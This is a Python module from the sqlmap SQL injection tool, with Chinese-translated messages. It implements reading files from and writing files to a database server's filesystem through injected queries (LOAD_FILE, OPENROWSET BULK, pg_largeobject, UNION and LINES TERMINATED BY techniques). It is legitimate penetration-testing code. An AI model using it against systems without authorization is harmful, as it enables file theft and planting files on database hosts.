#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import codecs
import os
import sys

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import checkFile
from lib.core.common import dataToOutFile
from lib.core.common import decloakToTemp
from lib.core.common import decodeDbmsHexValue
from lib.core.common import isListLike
from lib.core.common import isNumPosStrValue
from lib.core.common import isStackingAvailable
from lib.core.common import isTechniqueAvailable
from lib.core.common import readInput
from lib.core.compat import xrange
from lib.core.convert import encodeBase64
from lib.core.convert import encodeHex
from lib.core.convert import getText
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapUndefinedMethod
from lib.core.settings import UNICODE_ENCODING
from lib.request import inject

class Filesystem(object):
    """
    这个类为插件定义了通用的操作系统文件系统功能。
    """

    def __init__(self):
        self.fileTblName = "%sfile" % conf.tablePrefix
        self.tblField = "data"

    def _checkFileLength(self, localFile, remoteFile, fileRead=False):
        if Backend.isDbms(DBMS.MYSQL):
            lengthQuery = "LENGTH(LOAD_FILE('%s'))" % remoteFile

        elif Backend.isDbms(DBMS.PGSQL) and not fileRead:
            lengthQuery = "SELECT SUM(LENGTH(data)) FROM pg_largeobject WHERE loid=%d" % self.oid

        elif Backend.isDbms(DBMS.MSSQL):
            self.createSupportTbl(self.fileTblName, self.tblField, "VARBINARY(MAX)")
            inject.goStacked("INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK '%s', SINGLE_BLOB) AS %s(%s)" % (self.fileTblName, self.tblField, self.tblField, remoteFile, self.fileTblName, self.tblField))

            lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)

        try:
            localFileSize = os.path.getsize(localFile)
        except OSError:
            warnMsg = "文件 '%s' 不存在" % localFile
            logger.warning(warnMsg)
            localFileSize = 0

        if fileRead and Backend.isDbms(DBMS.PGSQL):
            logger.info("无法在 PostgreSQL 上检查读取的文件 '%s' 的长度" % remoteFile)
            sameFile = True
        else:
            logger.debug("检查远程文件 '%s' 的长度" % remoteFile)
            remoteFileSize = inject.getValue(lengthQuery, resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
            sameFile = None

            if isNumPosStrValue(remoteFileSize):
                remoteFileSize = int(remoteFileSize)
                localFile = getUnicode(localFile, encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)
                sameFile = False

                if localFileSize == remoteFileSize:
                    sameFile = True
                    infoMsg = "本地文件 '%s' 和远程文件 " % localFile
                    infoMsg += "'%s' 的大小相同(%d B)" % (remoteFile, localFileSize)
                elif remoteFileSize > localFileSize:
                    infoMsg = "远程文件 '%s' 较大(%d B)" % (remoteFile, remoteFileSize)
                    infoMsg += "比本地文件 '%s' (%dB)" % (localFile, localFileSize)
                else:
                    infoMsg = "远程文件 '%s' 较小(%d B)" % (remoteFile, remoteFileSize)
                    infoMsg += "比文件 '%s' (%d B)" % (localFile, localFileSize)

                logger.info(infoMsg)
            else:
                sameFile = False
                warnMsg = "看起来文件还没有被写入(通常是因为 DBMS 进程用户在目标路径上没有写入权限)"
                logger.warning(warnMsg)

        return sameFile

    def fileToSqlQueries(self, fcEncodedList):
        """
        被 MySQL 和 PostgreSQL 插件调用,以在后端 DBMS 的文件系统上写入文件
        """

        counter = 0
        sqlQueries = []

        for fcEncodedLine in fcEncodedList:
            if counter == 0:
                sqlQueries.append("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, fcEncodedLine))
            else:
                updatedField = agent.simpleConcatenate(self.tblField, fcEncodedLine)
                sqlQueries.append("UPDATE %s SET %s=%s" % (self.fileTblName, self.tblField, updatedField))

            counter += 1

        return sqlQueries

    def fileEncode(self, fileName, encoding, single, chunkSize=256):
        """
        被 MySQL 和 PostgreSQL 插件调用,以在后端 DBMS 的文件系统上写入文件
        """

        checkFile(fileName)

        with open(fileName, "rb") as f:
            content = f.read()

        return self.fileContentEncode(content, encoding, single, chunkSize)

    def fileContentEncode(self, content, encoding, single, chunkSize=256):
        retVal = []

        if encoding == "hex":
            content = encodeHex(content)
        elif encoding == "base64":
            content = encodeBase64(content)
        else:
            content = codecs.encode(content, encoding)

        content = getText(content).replace("\n", "")

        if not single:
            if len(content) > chunkSize:
                for i in xrange(0, len(content), chunkSize):
                    _ = content[i:i + chunkSize]

                    if encoding == "hex":
                        _ = "0x%s" % _
                    elif encoding == "base64":
                        _ = "'%s'" % _

                    retVal.append(_)

        if not retVal:
            if encoding == "hex":
                content = "0x%s" % content
            elif encoding == "base64":
                content = "'%s'" % content

            retVal = [content]

        return retVal

    def askCheckWrittenFile(self, localFile, remoteFile, forceCheck=False):
        choice = None

        if forceCheck is not True:
            message = "你是否要确认本地文件 '%s' " % localFile
            message += "已成功写入后端 DBMS "
            message += "文件系统('%s')？ [Y/n] " % remoteFile
            choice = readInput(message, default='Y', boolean=True)

        if forceCheck or choice:
            return self._checkFileLength(localFile, remoteFile)

        return True

    def askCheckReadFile(self, localFile, remoteFile):
        if not kb.bruteMode:
            message = "你是否要确认远程文件 '%s' " % remoteFile
            message += "已成功从后端 "
            message += "DBMS 文件系统下载？ [Y/n] "

            if readInput(message, default='Y', boolean=True):
                return self._checkFileLength(localFile, remoteFile, True)

        return None

    def nonStackedReadFile(self, remoteFile):
        errMsg = "'nonStackedReadFile' 方法必须在特定的 DBMS 插件中定义"
        raise SqlmapUndefinedMethod(errMsg)

    def stackedReadFile(self, remoteFile):
        errMsg = "'stackedReadFile' 方法必须在特定的 DBMS 插件中定义"
        raise SqlmapUndefinedMethod(errMsg)

    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "'unionWriteFile' 方法必须在特定的 DBMS 插件中定义"
        raise SqlmapUndefinedMethod(errMsg)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "'stackedWriteFile' 方法必须在特定的 DBMS 插件中定义"
        raise SqlmapUndefinedMethod(errMsg)

    def readFile(self, remoteFile):
        localFilePaths = []

        self.checkDbmsOs()

        for remoteFile in remoteFile.split(','):
            fileContent = None
            kb.fileReadMode = True

            if conf.direct or isStackingAvailable():
                if isStackingAvailable():
                    debugMsg = "尝试使用堆叠查询 SQL 注入技术读取文件"
                    logger.debug(debugMsg)

                fileContent = self.stackedReadFile(remoteFile)
            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "尝试使用非堆叠查询 SQL 注入技术读取文件"
                logger.debug(debugMsg)

                fileContent = self.nonStackedReadFile(remoteFile)
            else:
                errMsg = "没有检测到可用于从后端文件系统读取文件的 SQL 注入技术"
                errMsg += "DBMS 服务器为 %s" % Backend.getDbms()
                logger.error(errMsg)

                fileContent = None

            kb.fileReadMode = False

            if fileContent in (None, "") and not Backend.isDbms(DBMS.PGSQL):
                self.cleanup(onlyFileTbl=True)
            elif isListLike(fileContent):
                newFileContent = ""

                for chunk in fileContent:
                    if isListLike(chunk):
                        if len(chunk) > 0:
                            chunk = chunk[0]
                        else:
                            chunk = ""

                    if chunk:
                        newFileContent += chunk

                fileContent = newFileContent

            if fileContent is not None:
                fileContent = decodeDbmsHexValue(fileContent, True)

                if fileContent.strip():
                    localFilePath = dataToOutFile(remoteFile, fileContent)

                    if not Backend.isDbms(DBMS.PGSQL):
                        self.cleanup(onlyFileTbl=True)

                    sameFile = self.askCheckReadFile(localFilePath, remoteFile)

                    if sameFile is True:
                        localFilePath += " (同一个文件)"
                    elif sameFile is False:
                        localFilePath += " (与远程文件大小不同)"

                    localFilePaths.append(localFilePath)
                elif not kb.bruteMode:
                    errMsg = "未检索到数据"
                    logger.error(errMsg)

        return localFilePaths

    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        written = False

        checkFile(localFile)

        self.checkDbmsOs()

        if localFile.endswith('_'):
            localFile = getUnicode(decloakToTemp(localFile))

        if conf.direct or isStackingAvailable():
            if isStackingAvailable():
                debugMsg = "使用堆叠查询技术上传文件 '%s'" % fileType
                logger.debug(debugMsg)

            written = self.stackedWriteFile(localFile, remoteFile, fileType, forceCheck)
            self.cleanup(onlyFileTbl=True)
        elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and Backend.isDbms(DBMS.MYSQL):
            debugMsg = "使用 UNION 查询技术上传文件 '%s'" % fileType
            logger.debug(debugMsg)

            written = self.unionWriteFile(localFile, remoteFile, fileType, forceCheck)
        elif Backend.isDbms(DBMS.MYSQL):
            debugMsg = "使用 LINES TERMINATED BY 技术上传文件 '%s'" % fileType
            logger.debug(debugMsg)

            written = self.linesTerminatedWriteFile(localFile, remoteFile, fileType, forceCheck)
        else:
            errMsg = "没有检测到可用于将文件写入后端文件系统的 SQL 注入技术"
            errMsg += "DBMS 服务器为 %s" % Backend.getDbms()
            logger.error(errMsg)

            return None

        return written
